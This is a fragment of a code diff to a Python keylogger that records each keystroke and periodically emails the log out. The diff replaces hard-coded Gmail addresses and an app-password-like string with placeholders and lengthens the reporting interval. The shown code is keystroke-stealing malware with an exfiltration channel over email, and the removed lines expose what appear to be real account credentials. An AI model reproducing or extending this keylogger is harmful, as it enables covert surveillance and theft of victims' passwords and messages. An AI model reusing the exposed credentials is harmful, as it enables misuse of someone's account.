@@ -19,9 +19,9 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "guptaderron2001alt@gmail.com"
-    EMAIL_PASSWORD = "mqzqgxrmzfawyooi"
-    SEND_REPORT_EVERY = 10 # as in seconds
+    EMAIL_ADDRESS = "sendermail"
+    EMAIL_PASSWORD = "password"
+    SEND_REPORT_EVERY = 300
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
@@ -58,8 +58,8 @@ finally:
             self.appendlog(current_key)
 
         def send_mail(self, email, password, message):
-            email_sender = "guptaderron2001alt@gmail.com"
-            email_receiver = "guptaderron2001@gmail.com"
+            email_sender = "sendermail"
+            email_receiver = "receivermail"
             em = EmailMessage()
             subject = "Mailtrap"
             em['From'] = email_sender
